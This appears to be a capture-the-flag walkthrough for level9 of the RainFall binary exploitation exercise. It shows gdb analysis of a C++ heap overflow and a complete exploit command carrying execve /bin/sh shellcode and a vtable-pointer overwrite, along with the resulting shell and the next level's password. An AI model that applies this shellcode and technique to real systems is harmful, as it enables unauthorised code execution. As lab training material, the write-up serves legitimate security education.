# Walkthrough

## Solution
```
./level9 $(python -c "print 'A' * 63 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x78\xa0\x04\x08'")
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

```
## Explanation

### Execution

```
level9@RainFall:~$ ./level9 
level9@RainFall:~$ ./level9 hello
level9@RainFall:~$ ./level9 hello you
```
-> The programs does nothing  

### Disassembly

```
info var
All defined variables:
Non-debugging symbols:
0x08048840  vtable for N
0x08048850  typeinfo name for N
0x08048854  typeinfo for N

info function
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
```  

--> This is a C++ program.  
➜  RainFall git:(main) c++filt  _Znwj (to demangle a C++ name)
operator new(unsigned int)


You can view the commented asm code [here](Ressources/assembly.asm)  
You can view the asm code translated to C [here](source.c)  

### Steps

```
(gdb) run
Starting program: /home/user/level9/level9 
[Inferior 1 (process 2657) exited with code 01]
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info register
eax            0x41366441	1094083649
```  
--> Overflow offset is at 108. (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)  


```
Starting program: /home/user/level9/level9 $(python -c "print 'A' * 4 + 'B' * 104 + 'CCCC'")
Breakpoint 3, 0x0804867c in main ()
1: x/i $pc
=> 0x804867c <main+136>:	mov    0x10(%esp),%eax
(gdb) x/32wx $eax
0x804a00c:	0x41414141	0x42424242	0x42424242	0x42424242
0x804a01c:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a02c:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a03c:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a04c:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a05c:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a06c:	0x42424242	0x42424242	0x42424242	0x43434343
0x804a07c:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/x 0x804a00c + 4
0x804a010:	0x42424242
```  
The buffer starts at 0x804a00c.

shellcode: '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' - 45 chars


//////////////////////////////////////////////

./level9 $(python -c "print 'A' * 63 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x78\xa0\x04\x08'")
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

---


# NOTES


Breaking at 0x08048677 (just before calling setAnnotation)
```
(gdb) x/28wx 0x0804a00c
0x804a00c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a01c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a02c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a03c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a04c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a05c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a06c:      0x00000000      0x00000005      0x00000071      0x08048848
```

- with argument AAAA:
```
(gdb) x/28wx 0x0804a00c
0x804a00c:      0x41414141      0x00000000      0x00000000      0x00000000
0x804a01c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a02c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a03c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a04c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a05c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a06c:      0x00000000      0x00000005      0x00000071      0x08048848
```

- with shellcode:
```
(gdb) x/28wx 0x0804a00c
0x804a00c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a01c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a02c:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a03c:      0x41414141      0x41414141      0x41414141      0xeb414141
0x804a04c:      0x76895e1f      0x88c03108      0x46890746      0x890bb00c
0x804a05c:      0x084e8df3      0xcd0c568d      0x89db3180      0x80cd40d8
0x804a06c:      0xffffdce8      0x69622fff      0x68732f6e      0x0804a078
```

At address 0x0804a078, we had 0x08048848. We overrid it with 0x0804a078.

---

Breaking at 0x08048693 (just before calling edx):

- with argument AAAA:
```
(gdb) i r
eax            0x804a078        134520952
ecx            0x41414141       1094795585
edx            0x804873a        134514490
ebx            0x804a078        134520952
(gdb) x/i 0x804873a
   0x804873a <_ZN1NplERS_>:     push   %ebp
(gdb) x/wx 0x804873a
0x804873a <_ZN1NplERS_>:        0x8be58955
```

- with shellcode:
```
(gdb) i r
eax            0x804a078        134520952
ecx            0x804a078        134520952
edx            0x804a078        134520952
ebx            0x804a078        134520952
(gdb) x/i 0x804a078
   0x804a078:   js     0x804a01a
(gdb) x/wx 0x804a078
0x804a078:      0x0804a078
```
In the address 0x0804a078, we stocked an assembly operation `0x0804a078`, which corresponds to `js     0x804a01a`

source. test

- with AAAA
```
(gdb) i r
eax            0x80487d8        134514648
ecx            0x41414141       1094795585
edx            0x9b05008        162549768
ebx            0x9b05078        162549880
```

- with shellcode:
```
(gdb) i r
eax            0x80487d8        134514648
ecx            0x804a078        134520952
edx            0x9d93008        165228552
ebx            0x9d93078        165228664
```
